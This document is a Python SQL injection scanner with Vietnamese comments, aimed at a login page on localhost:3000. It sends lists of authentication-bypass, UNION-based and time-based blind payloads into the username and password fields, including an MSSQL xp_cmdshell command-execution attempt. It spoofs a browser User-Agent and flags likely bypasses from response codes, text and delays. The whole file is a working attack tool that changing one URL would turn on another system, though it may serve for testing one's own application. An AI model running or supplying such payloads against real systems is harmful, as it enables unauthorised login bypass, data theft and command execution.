import requests
import time  # Để đo time cho blind injection

# URL của trang login (từ ảnh của bạn)
url = 'http://localhost:3000/login'

# Header giả browser
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
}

# Payloads cho username/email field (bypass auth)
username_payloads = [
    # Generic/MySQL
    "' OR '1'='1' --",
    "admin' --",
    "' OR ''='' --",
    "') OR ('1'='1' --",
    "admin') --",
    "' or 0=0 --",
    "' or 0=0 #",
    " or 1=1--",
    "' or 'a'='a",
    "') or ('a'='a",
    'hi" or "a"="a',
    "hi' or 'x'='x';",
    # MSSQL specific
    "' or ''='",
    "admin' ) or ('1'='1' --",
    "admin') or ('1'='1' /{",
    # PostgreSQL/Oracle
    "';--",
    "' ) OR '1'='1",
    # Union-based (thử với 1-3 cột, giả định table users)
    "' UNION SELECT 'hacked' --",
    "' UNION SELECT NULL, 'hacked' --",
    "' UNION SELECT NULL, NULL, 'hacked' --",
    "') UNION SELECT username, password FROM users --",
    # Blind time-based
    "' AND SLEEP(5) --",
    "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
]

# Payloads cho password field (giữ username bình thường như 'admin')
password_payloads = [
    # Tương tự, inject vào password
    "OR '1'='1",
    "' or ''='",
    "') or ('1'='1",
    "admin' --",
    " OR 1=1 --",
    "' or 'a'='a",
    "') ; --",
    "'; EXEC xp_cmdshell('dir') --",  # MSSQL thử command (nếu enable)
]

print("Testing username injection...")
for payload in username_payloads:
    data = {'username': payload, 'password': 'anything'}  # Thay 'username' nếu là 'email'
    start_time = time.time()
    response = requests.post(url, data=data, headers=headers)
    elapsed = time.time() - start_time
    print(f"Payload (username): {payload}")
    print(f"Status code: {response.status_code}")
    print(f"Response time: {elapsed:.2f}s")
    # Kiểm tra bypass hoặc vulnerable
    if response.status_code in [200, 302] and all(word not in response.text.lower() for word in ['incorrect', 'error', 'invalid', 'sai', 'kiểm tra']):
        print("Có thể bypass! Response snippet:", response.text[:200])
    elif any(err in response.text.lower() for err in ['syntax', 'unexpected', 'near', 'sql', 'query']):
        print("Vulnerable (SQL error)! Response:", response.text[:200])
    elif elapsed > 5:  # Cho time-based
        print("Vulnerable (delay detected)!")
    else:
        print("Không vulnerable.")
    print("---")

print("Testing password injection...")
for payload in password_payloads:
    data = {'username': 'admin', 'password': payload}  # Giả định username là 'admin'
    start_time = time.time()
    response = requests.post(url, data=data, headers=headers)
    elapsed = time.time() - start_time
    print(f"Payload (password): {payload}")
    print(f"Status code: {response.status_code}")
    print(f"Response time: {elapsed:.2f}s")
    # Kiểm tra tương tự
    if response.status_code in [200, 302] and all(word not in response.text.lower() for word in ['incorrect', 'error', 'invalid', 'sai', 'kiểm tra']):
        print("Có thể bypass! Response snippet:", response.text[:200])
    elif any(err in response.text.lower() for err in ['syntax', 'unexpected', 'near', 'sql', 'query']):
        print("Vulnerable (SQL error)! Response:", response.text[:200])
    elif elapsed > 5:
        print("Vulnerable (delay detected)!")
    else:
        print("Không vulnerable.")
    print("---")